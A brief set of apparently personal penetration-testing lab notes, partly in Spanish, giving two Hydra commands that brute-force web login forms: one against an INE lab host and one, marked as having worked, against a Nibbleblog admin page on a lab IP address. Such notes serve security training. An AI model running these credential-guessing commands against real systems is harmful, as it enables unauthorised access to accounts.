`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-post-form "/acp/login:login_name=^USER^&login_psw=^PASS^:F=Login"


Ejemplos que funcionaron:

```bash
hydra -l admin -P wordlist.txt 10.129.155.168 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:F=Incorrect username or password."
```
`